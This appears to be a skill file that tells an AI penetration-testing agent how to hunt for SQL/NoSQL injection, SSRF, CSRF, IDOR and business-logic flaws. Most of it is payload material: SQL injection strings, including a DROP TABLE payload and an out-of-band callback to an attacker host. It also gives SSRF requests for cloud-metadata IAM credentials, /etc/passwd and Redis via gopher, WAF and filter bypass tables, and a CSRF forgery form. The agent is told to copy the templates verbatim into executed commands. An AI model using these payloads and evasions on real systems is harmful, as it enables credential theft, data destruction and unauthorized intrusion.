---
name: hunt-skill
description: "Unified hunting-knowledge skill for the W2 triage + W4 penetration specialists. Consolidates 5 prior hunt-* skills (hunt-sqli / hunt-ssrf / hunt-csrf / hunt-idor / hunt-business-logic) into a single multi-class knowledge base. Use when a vuln class falls into: SQL/NoSQL injection, SSRF (full-read / blind / cloud-metadata pivot), CSRF (SameSite / token-binding / content-type / double-submit), IDOR/BOLA/BFLA, or business-logic flaws (race / state-machine / discount-stacking). Each class section carries Crown Jewel targets, attack-surface signals, a class-by-class marker sweep, WAF/filter bypass tables, and disclosed-report pattern templates (verbatim shape for the W2 `TriageEvidence.disclosed_report_patterns[]` and the W4 `PentrationFinding.classification` row). NOT for XSS, XXE, deserialization, command injection, or SSTI — those have their own (forthcoming) bundled skills."
homepage: ""
provenance:
  origin: opensquilla
  license: MIT
  upstream_url: "https://github.com/elementalsouls/Claude-BugHunter/blob/main/skills/"
  maintained_by: OpenSquilla
  attribution: "Knowledge patterns consolidated from Claude-BugHunter hunt-sqli / hunt-ssrf / hunt-csrf / hunt-idor / hunt-business-logic (Sachin Sharma, MIT). Re-distilled for OpenSquilla's Pydantic-typed evidence pipeline."
metadata:
  {
    "platform": { "emoji": "🎯" },
    "opensquilla": {
      "risk": "low",
      "capabilities": ["knowledge:read"],
      "requires_tools": []
    }
  }
---

# hunt-skill — Unified Hunting Knowledge for W2 + W4 Specialists

> **Consolidated 2026-06-15** from 5 prior bundled skills:
> `hunt-sqli` (SQL/NoSQL injection), `hunt-ssrf` (server-side request forgery),
> `hunt-csrf` (cross-site request forgery), `hunt-idor` (IDOR/BOLA/BFLA),
> `hunt-business-logic` (race / state-machine / discount-stacking).
> The old `hunt-skill-map` index is now folded into § Class → Hunt Skill Map below.

This skill is a **knowledge pointer** consumed by the W2 triage
and W4 penetration specialists. It does NOT execute scans — it
supplies:
  - **Crown Jewel targets** — where each class pays the most
  - **Attack surface signals** — URL / header / JS / tech cues
  - **Step-by-step methodology** — class-by-class marker sweep
  - **Bypass tables** — WAF / filter / encoding evasions
  - **Pattern Library** — payload templates per class

The W2 triage specialist populates
`TriageEvidence.disclosed_report_patterns[]` rows from this
pattern library; the W4 penetration specialist copies
`payload_template` into `ReproduceStep.command`. The patterns
are **evidence-shaped** to match `PentrationFinding`
`classification.cwe` / `owasp_top10_2021` / `mitre_attack` fields.

---

## Class → Hunt Skill Map (vuln_class → which § to read)

| vuln_class (pentest-v1) | section to read |
|---|---|
| `injection_sql` / `injection_nosql` | § 1 SQL & NoSQL Injection |
| `injection_ssrf` (full-read / blind / cloud-meta) | § 2 SSRF |
| `broken_session_csrf` | § 3 CSRF |
| `broken_access_idor` / `broken_access_bola` / `broken_access_bfla` | § 4 IDOR / BOLA / BFLA |
| `business_logic_race` / `business_logic_state_machine` / `business_logic_workflow_skip` / `business_logic_price_qty` / `business_logic_discount_stack` | § 5 Business Logic |
| any other class (XSS / XXE / RCE / SSTI / deserialization / JWT / OAuth) | NOT covered here — separate forthcoming bundled skills |

---

## 1. SQL & NoSQL Injection

> 12-class marker sweep (error / boolean / time / UNION / stacked / second-order / OOB + NoSQL variants + ORM raw-fragment + OIDC-proxy).

### Crown Jewel Targets
SQL injection remains one of the highest-paying classes because it
directly threatens data confidentiality, integrity, and availability
at scale.

- **Multi-tenant SaaS** — one injection exposes all customer data
- **E-commerce / payments** — PII, card data, transaction records
- **Search / filter / sort / report** endpoints — direct input to
  query builder
- **Analytics / tracking subdomains** — fast-built, lightly tested
- **3rd-party plugins on enterprise installs** — WordPress, CMS
  extensions
- **Internal tooling exposed externally** — Airflow, GitHub
  Enterprise, admin dashboards
- **NoSQL backends** — MongoDB $where / $regex / $gt

### Attack Surface Signals
URL patterns:
```
/search?q=  /filter?category=  /sort?by=&order=  /report?start_date=&end_date=
/api/v1/items?id=  /index.php?id=  /gallery?album_id=  /track?uid=&campaign=
?page=&limit=&offset=
```

Header / tech signals:
- `X-Powered-By: PHP` → likely MySQL/PostgreSQL backend
- `Server: Apache` + PHP → classic LAMP
- `X-Powered-By: Express` → possible MongoDB
- DB error messages leaking in responses

JS patterns (look in bundles):
```js
fetch(`/api/search?q=${userInput}`)
$.ajax({ url: '/filter?sort=' + param })
axios.get('/report?from=' + startDate + '&to=' + endDate)
```

NoSQL content-type signals:
- `Content-Type: application/json` with nested object parameters
- Array params: `param[]=value` or `{"key": {"$gt": ""}}`

### Methodology (marker sweep)
The OpenSquilla **marker discipline** (one synthetic, identifiable
marker per class) maps to the W4 `ReproduceStep.failure_markers` +
`body_required_substrings` fields. For each parameter, run all
12 classes — never stop at "first-class-returning-401/403":

| # | Class | Marker (synthetic) | Detection |
|---|-------|-------------------|-----------|
| 1 | error-based | `'` / `"` / backtick | DB error message in body |
| 2 | boolean-blind | `' AND '1'='1` vs `' AND '1'='2` | response-length diff |
| 3 | time-blind | `' OR SLEEP(5)--` | 5s+ response delay |
| 4 | UNION-based | `' ORDER BY 9--` then `' UNION SELECT 1,2,3--` | column count match |
| 5 | stacked | `'; DROP TABLE x;--` | DDL/DML side effect (read-only mode: skip) |
| 6 | second-order | register with `'`, view profile later | payload re-fired on read |
| 7 | out-of-band | `'; EXEC xp_dirtree '//attacker'--` | DNS/HTTP callback |
| 8 | NoSQL `$where` | `{"$where":"sleep(5000)"}` | 5s+ delay (Mongo) |
| 9 | NoSQL `$regex` | `{"name":{"$regex":"^a"}}` | enumerated matches |
| 10 | NoSQL `$gt` | `{"pwd":{"$gt":""}}` | auth bypass |
| 11 | ORM raw-fragment | `?filter=id;UNION SELECT...` | Django CVE-2024-42005 / Sequelize GHSA-wrh9-cjv3-2hpw / Prisma |
| 12 | OIDC-proxy backend | exploit OIDC upstream's SQL backend | see `hunt-oauth` |

### Bypass Tables
- **WAF keyword bypass**: `/**/UNION/**/SELECT`, `UnIoN SeLeCt`,
  `/*!50000 UNION*/ SELECT`
- **Encoding bypass**: `%55NION` (URL), `U%4eION` (UTF-8 partial)
- **Comment bypass**: `UNI/**/ON`, `UN%0aION` (newline)
- **HTTP Parameter Pollution**: `?id=1&id=' OR 1=1--` (parser-disagreement)
- **JSON key bypass**: `{"id": {"$gt": ""}}` in JSON body
- **Header injection**: `X-Forwarded-For: ' OR 1=1--`

### Pattern Library → `disclosed_report_patterns[]` row shape
```json
{
  "vuln_class": "injection_sql",
  "source": "hackerone_public",
  "report_id": "H1-classic-search-sqli-2024",
  "cve": null,
  "tech_stack": ["PHP", "MySQL"],
  "pattern_summary": "Search endpoint /search?q= directly concatenated into MySQL query",
  "payload_template": "curl -s 'https://target/search?q=z1z%27%20OR%20%271%27%3D%271'",
  "bypass_table": ["url-encode-the-quote", "use-+instead-of-space"]
}
```

This is the exact shape the W2 triage specialist fills in
`TriageEvidence.disclosed_report_patterns[]` and that the W4
specialist copies verbatim into
`PenetrationFinding.classification.disclosed_report_patterns[]`.

### Result marker expectation

```
schema: pentest-v1 | phase: exploitation | wave: 4/8 | deps: W2.sqli.1
```

---

## 2. Server-Side Request Forgery (SSRF)

> 12-class marker sweep covering full-read (response body), blind (DNS / HTTP callback), protocol smuggling (gopher / file / dict), and cloud-metadata pivots (AWS / GCP / Azure 169.254.169.254).

### Crown Jewel Targets
- **Cloud metadata** — `169.254.169.254` (AWS), `metadata.google.internal` (GCP)
- **Internal admin panels** — Grafana, Kibana, Prometheus `/api/v1/...`
- **Self-hosted PaaS** — Airflow, GitLab, Jenkins, Kubernetes dashboard
- **PDF / image generators** — wkhtmltopdf, ImageMagick, headless Chrome
- **Webhook / callback validators** — Slack/Discord/Teams webhooks
- **URL preview / unfurl** — link unfurl, oEmbed, OpenGraph fetch
- **OAuth / SAML callback** — redirect_uri / ACS URL validation bypass

### Attack Surface Signals
URL patterns:
```
?url=  ?image=  ?feed=  ?site=  ?page=  ?view=  ?path=
?dest=  ?redirect=  ?uri=  ?callback=  ?fetch=
/api/v1/preview?url=  /api/v1/screenshot?url=  /api/v1/import?url=
/proxy?url=  /fetch?url=  /render?url=  /load?url=
```

Header / content-type signals:
- `X-Forwarded-For` / `X-Real-IP` reflected in response (often SSRF-adjacent)
- `Location: <attacker-controlled>` after a fetch
- Internal IPs / hostnames in error messages

JS patterns (in bundles):
```js
fetch(`/api/preview?url=${userInput}`)
new URL(req.body.url).then(r => r.text())
axios.get(req.query.feed)  // direct
```

### Methodology (marker sweep)
| # | Class | Marker (synthetic) | Detection |
|---|-------|--------------------|-----------|
| 1 | AWS metadata | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | creds in body |
| 2 | GCP metadata | `http://metadata.google.internal/computeMetadata/v1/` | token in body |
| 3 | Azure metadata | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | metadata in body |
| 4 | DigitalOcean | `http://169.254.169.254/metadata/v1/` | metadata in body |
| 5 | localhost loop | `http://127.0.0.1:8080/admin` | admin panel content |
| 6 | private RFC1918 | `http://10.0.0.5/`, `http://192.168.1.1/` | internal response |
| 7 | link-local | `http://169.254.169.254/` | cloud metadata |
| 8 | DNS rebind | `http://rbndr.us/...` or `1.0.0.1` ↔ `169.254.169.254` (one domain, two A records) | first request → 1.0.0.1, second → 169.254.169.254 |
| 9 | redirect chase | `http://attacker.com/redirect-to-169.254.169.254` | 30x follow |
| 10 | protocol smuggle | `gopher://internal:6379/_*1%0d%0a$4%0d%0aPING%0d%0a` (Redis) | redis response |
| 11 | file scheme | `file:///etc/passwd` | file content |
| 12 | collaborator | `http://xyz.burpcollaborator.net/` | DNS callback (blind) |

### Bypass Tables
- **Decimal IP**: `2130706433` = `127.0.0.1` (decimal)
- **Octal IP**: `0177.0.0.1` = `127.0.0.1` (octal first octet)
- **Hex IP**: `0x7f.0.0.1` = `127.0.0.1`
- **IPv6 loopback**: `[::1]`, `[0:0:0:0:0:0:0:1]`
- **IPv4-mapped IPv6**: `[::ffff:127.0.0.1]`
- **URL parsing confusion**: `http://attacker.com@127.0.0.1/` (userinfo confusion)
- **DNS rebind**: domain with two A records (public + private)
- **URL fragment bypass**: `http://target.com#@127.0.0.1/`
- **Redirect-based**: server fetches `attacker.com` → 302 → 169.254.169.254
- **Encoding**: `%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34` (full URL-encode)
- **302 follow**: redirects from in-scope to out-of-scope

### Pattern Library → `disclosed_report_patterns[]` row shape
```json
{
  "vuln_class": "injection_ssrf",
  "source": "github_security_advisories",
  "report_id": "GHSA-confluence-ssrf-2024",
  "cve": "CVE-2024-XXXX",
  "tech_stack": ["Java", "Atlassian Confluence"],
  "pattern_summary": "/admin/rest/api/1.0/preview body url field fetched server-side without protocol allowlist",
  "payload_template": "curl -s -X POST 'https://target/admin/rest/api/1.0/preview' -H 'Content-Type: application/json' -d '{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}'",
  "bypass_table": ["ipv6-loopback", "decimal-ip", "url-parse-userinfo"]
}
```

### Result marker expectation

```
schema: pentest-v1 | phase: exploitation | wave: 4/8 | deps: W2.ssrf.1
```

---

## 3. Cross-Site Request Forgery (CSRF)

> 10-class marker sweep for state-changing endpoints, including SameSite bypass, token-not-bound-to-session, content-type-text-only, double-submit cookie, and referer/origin check bypass.

### Crown Jewel Targets
- **State-changing POSTs without anti-CSRF** — money transfer,
  email change, password change, account deletion, role promotion
- **Multi-step flows** — checkout, 2FA disable, OAuth re-bind
- **JSON content-type with simple content-type bypass** — see class 4
- **SameSite=None default** — modern browsers, 3rd-party cookies

### Attack Surface Signals
URL patterns:
- `POST /api/account/delete` / `POST /api/account/email` / `POST /api/account/password`
- `POST /transfer` / `POST /checkout/complete` / `POST /api/v1/users/{id}/role`
- `POST /api/2fa/disable` / `POST /api/oauth/bind`

Header / cookie signals:
- `Set-Cookie: <name>=...; SameSite=None` (default in some frameworks)
- `Set-Cookie: <name>=...; Secure` (NO SameSite → defaults to Lax)
- Missing `X-Frame-Options` / `Content-Security-Policy: frame-ancestors`
- Token in form field, NOT double-submit cookie

JS patterns:
```js
fetch('/api/account/email', { method: 'POST', body: JSON.stringify({email: x}), credentials: 'include' })
// NOTE: no CSRF token, no SameSite
```

### Methodology (marker sweep)
| # | Class | Marker (synthetic) | Detection |
|---|-------|--------------------|-----------|
| 1 | no-token baseline | `curl -X POST -b cookies` (no CSRF) | 200 → vulnerable |
| 2 | token-removed | strip `X-CSRF-Token` / `_csrf` form field | 200 → token unenforced |
| 3 | token-swapped | victim's session + attacker's CSRF token | 200 → token not bound to session |
| 4 | content-type-text-only | `Content-Type: text/plain` (server only checks for "no preflight") | 200 → server bypasses CORS preflight on simple content-type |
| 5 | double-submit cookie | remove one of the cookie or header token | 200 → server compares cookie and header token, but if either is missing the other suffices |
| 6 | referer-strict-bypass | `Referer: https://attacker.com/` | 200 if referer-or-check skipped when no header |
| 7 | referer-prefix-bypass | `Referer: https://target.com.attacker.com/` | 200 if server uses `startsWith()` instead of `same-origin` |
| 8 | method-override | POST → PUT or `_method=PUT` body | 200 if server only enforces CSRF on POST |
| 9 | SameSite-default-bypass | top-level GET → 302 → POST | 200 if `Lax` allows top-level navigation POST (none of the major browsers allow this, but old browsers do) |
| 10 | flash/file-upload | multipart/form-data upload triggers action | 200 if endpoint accepts file uploads without CSRF |

### Bypass Tables
- **No-CORS GET with body**: GET with `?amount=victim&to=attacker` and
  side-effect (against HTTP spec, but some servers do it)
- **`target=_blank`**: open in new tab, third-party cookie still sent
  if `SameSite=None`
- **`<form enctype="text/plain">`**: trigger simple POST with
  attacker-controlled JSON-formatted body
- **Service worker fetch**: bypass SameSite=Lax in some PWA flows
- **`<img src="...">` + DNS prefetch**: only for GET side-effects

### Pattern Library → `disclosed_report_patterns[]` row shape
```json
{
  "vuln_class": "broken_session_csrf",
  "source": "hackerone_public",
  "report_id": "H1-shopify-csrf-2024",
  "cve": null,
  "tech_stack": ["Ruby", "Rails"],
  "pattern_summary": "POST /api/account/email accepts no CSRF token; only checks Authorization Bearer header; cross-origin fetch from attacker domain succeeds due to permissive CORS",
  "payload_template": "<form action='https://target/api/account/email' method='POST' enctype='text/plain'><input name='{\"email\":\"attacker@evil\",\"x\":\"y\"}' value=''></form>",
  "bypass_table": ["cors-allow-origin-wildcard-with-credentials"]
}
```

### Result marker expectation

```
schema: pentest-v1 | phase: exploitation | wave: 4/8 | deps: W2.csrf.1
```

---

## 4. IDOR / BOLA / BFLA

> Multi-perspective ladder (URL / body / header / multi-tenant / file-id / hash-id) plus 12-class marker sweep + 26 disclosed-report patterns.

### Crown Jewel Targets
| Asset Type | Why It Pays |
|---|---|
| Financial / billing APIs | PII + financial data (Shopify, Uber, PayPal) |
| Private repositories / source | IP theft, critical data loss (GitHub) |
| User messages / DMs | Privacy violation at scale (Reddit) |
| Account mgmt endpoints | User add / delete / privesc (PayPal, Mozilla) |
| Business / org admin | Cross-tenant escalation, employee PII (Uber) |
| Content moderation / admin | Operational sabotage (Reddit mod logs) |

### Attack Surface Signals
URL patterns that scream IDOR:
```
/api/v1/users/{id}/  /api/v*/orders/{order_id}  /invoices/download?id=
/reports/{uuid}/  /messages/{thread_id}  /admin/orgs/{org_id}/members
/migration/{migration_id}/files  /graphql (query params with IDs)
/api/business/{business_id}/  /vouchers/{voucher_id}/policy
```

Header / content-type signals:
- `Content-Type: application/json` on endpoints accepting raw IDs
- No `X-Frame-Options` or CORS misconfigs paired with ID params
- `Authorization: Bearer` tokens user-scoped but hitting org-level resources

JS patterns (in bundles):
```js
fetch(`/api/v1/users/${userId}/profile`)
axios.get('/invoices/' + invoiceId)
graphql query { billingDocument(id: $docId) }
```

### Methodology (marker sweep)
| Perspective | What to check |
|---|---|
| Horizontal (same role) | User A's token + User B's ID → IDOR |
| Vertical (different role) | Regular user → `/admin/deleteUser` (BFLA) |
| Data flow (proxy view) | Hidden params in JSON: `debug=false`, `discount_rate` |
| Time/State | Race conditions, post-delete session reuse |
| Client environment | Mobile UA → legacy API with weaker auth |
| Business impact | "What's the $ damage if this breaks?" |

### Bypass Tables
- **HTTP method tampering**: GET → DELETE / PUT (BOLA → BFLA)
- **Content-Type confusion**: `application/json` → `application/x-www-form-urlencoded`
- **Encoding**: `%31` (numeric entity), `0x31` (hex), `\\u0031` (unicode)
- **Case**: `Admin` vs `admin` (case-sensitive role checks)
- **Mass assignment**: `{"role":"admin","is_admin":true,"privilege":"root"}`
- **JWT swap**: change `sub` claim, keep signature → check server validation
- **HPP**: `?id=1&id=victim` (last-wins vs first-wins vs concat)

### Pattern Library → `disclosed_report_patterns[]` row shape
```json
{
  "vuln_class": "broken_access_idor",
  "source": "hackerone_public",
  "report_id": "H1-shopify-billing-2024",
  "cve": null,
  "tech_stack": ["Ruby", "Rails"],
  "pattern_summary": "/api/v1/invoices/{id}/download returns another tenant's invoice PDF without auth check",
  "payload_template": "curl -s -H 'Authorization: Bearer <user-A-token>' 'https://target/api/v1/invoices/<user-B-invoice-id>/download'",
  "bypass_table": ["tenant-id-header-mismatch", "user-B-invoice-id-from-public-graphql"]
}
```

This is the exact shape the W2 triage specialist fills in
`TriageEvidence.disclosed_report_patterns[]`.

### Result marker expectation

```
schema: pentest-v1 | phase: exploitation | wave: 4/8 | deps: W2.idor.1
```

---

## 5. Business Logic Flaws (race / state-machine / price-qty / discount-stack / workflow-skip)

> 15-class marker sweep — the catch-all for workflow / state-machine / price / discount / negative-time / negative-amount / overflow / race.

### Crown Jewel Targets
- **Money / wallets / credits** — transfers, top-ups, redemption
- **E-commerce checkout** — coupon stacking, race on stock,
  price manipulation, currency mismatch
- **Multi-step workflows** — signup → email-verify → 2FA → first-use
- **Referral / loyalty / promo programs** — code reuse, self-referral
- **Trial / subscription** — downgrade-then-reuse, time-travel
- **Approval / moderation flows** — bypass-approver, role-mix

### Attack Surface Signals
URL patterns:
- `POST /transfer` / `POST /redeem` / `POST /apply-coupon`
- `POST /api/checkout/apply-promo` / `POST /api/v1/cart/items`
- `POST /api/2fa/disable` / `POST /api/account/upgrade`
- `POST /admin/approve` / `POST /api/users/{id}/role`
- `POST /api/v1/payouts` / `POST /api/v1/refunds`

JS / API patterns (look in bundles for):
```js
fetch('/api/cart/items', { method: 'POST', body: JSON.stringify({sku, qty: -1, price: 0}) })
fetch('/api/redeem', { method: 'POST', body: JSON.stringify({code: 'PROMO', count: 100}) })
```

### Methodology (marker sweep)
| # | Class | Marker (synthetic) | Detection |
|---|-------|--------------------|-----------|
| 1 | negative quantity | `qty=-1` | total = -price (refund) |
| 2 | zero price | `price=0` / `price=0.00` | checkout total = 0 |
| 3 | overflow quantity | `qty=9999999999` | negative total after overflow |
| 4 | price-in-body | add `price=0` to body | server trusts client price |
| 5 | currency-mismatch | `currency=EUR` body, `currency=USD` server-default | FX-rate exploit |
| 6 | coupon-stack | apply 2 coupons in same request | both apply |
| 7 | coupon-reuse | redeem same code N times | N credits |
| 8 | race-condition | 10 parallel `redeem` requests | 10 credits from 1 code |
| 9 | workflow-skip | POST /checkout/success without /checkout/pay | success response |
| 10 | 2FA-bypass | verify first step, skip POST /api/2fa/verify | access granted |
| 11 | self-referral | referrer = self | both sides get credit |
| 12 | downgrade-reuse | downgrade, then re-upgrade | new trial |
| 13 | time-travel | set server-clock via header | expired-coupon-still-works |
| 14 | role-mix | login as user, send admin-action via user's session | admin action succeeds (BFLA — also hunt-idor) |
| 15 | approval-bypass | submit for approval, set `approved_by=admin` in body | approval granted |

### Bypass Tables
- **Class 8 race**: 10x parallel curl, or `ffuf -t 1` with multiple
  connections, or Burp Intruder "Null payloads" with 10 concurrent
- **Class 13 time-travel**: most servers don't trust client clock
  but some use `X-Timestamp` for caching
- **Class 11 self-referral**: try `referrer_email=self` AND
  `referrer_code=self` AND `referred_by=current_user_id` —
  different forms catch different server code

### Pattern Library → `disclosed_report_patterns[]` row shape
```json
{
  "vuln_class": "business_logic_workflow_skip",
  "source": "hackerone_public",
  "report_id": "H1-shopify-checkout-skip-2024",
  "cve": null,
  "tech_stack": ["Ruby", "Rails"],
  "pattern_summary": "POST /api/checkout/complete accepts request without first requiring /api/checkout/pay to complete; workflow state machine does not enforce payment-before-complete",
  "payload_template": "curl -s -X POST -H 'Authorization: Bearer <user-token>' 'https://target/api/checkout/complete' -d '{\"order_id\":\"<order>\",\"payment_id\":\"BYPASS\"}'",
  "bypass_table": ["workflow-state-machine-bypass", "payment-id-not-validated"]
}
```

### Result marker expectation

```
schema: pentest-v1 | phase: exploitation | wave: 4/8 | deps: W2.business-logic.1
```

---

## Cross-Class Anti-patterns (apply to ALL 5 classes)

From redteam-mindset; these are the recurring failure modes the W4
specialist must avoid:

- **Don't stop at first-class-returning-401/403.** Run ALL classes in the relevant §. A 401 on SQLi class 1 doesn't mean class 5 (stacked) is also clean.
- **"Interesting constant token, not chased."** If you see a marker in the response, treat it as a *lead*, not *artifact*. Decode / re-fire.
- **Skill-gap-as-stop-condition.** If a vuln class isn't in this skill (XSS, XXE, SSTI, RCE, JWT, OAuth, deserialization), do the work manually using the vendor's public check matrix. Log the gap in the W8 report AND run the checks now.
- **Don't leak hunt-skill text verbatim into the LLM reply.** Use it as a *reference*; the actual exploitation goes into `ReproduceStep.command` + `outcome_match`.
- **Don't skip the bypass table.** A class returning 'filtering detected' isn't a fail — try the bypass rows before moving on.

---

## When to read this skill

- **W2 (vulnerability-triage)**: after candidate-finding, this skill supplies `disclosed_report_patterns[]` rows for each candidate. Use the § Crown Jewel + Attack Surface + Pattern Library sub-sections.
- **W4 (penetration)**: when constructing `ReproduceStep.command` for a `PentrationFinding`, the § Step-by-Step Methodology + Bypass Tables sub-sections are the primary input. Copy `payload_template` from the § Pattern Library into the `command` field verbatim (URL-encode where the template shows it).
- **W8 (reporting-remediation)**: cite this skill by name + section when explaining how a finding was discovered. Operator audit will look up the methodology.

End with the standard envelope marker:

```
schema: pentest-v1 | phase: exploitation | wave: 4/8 | deps: W2.triage.1
```
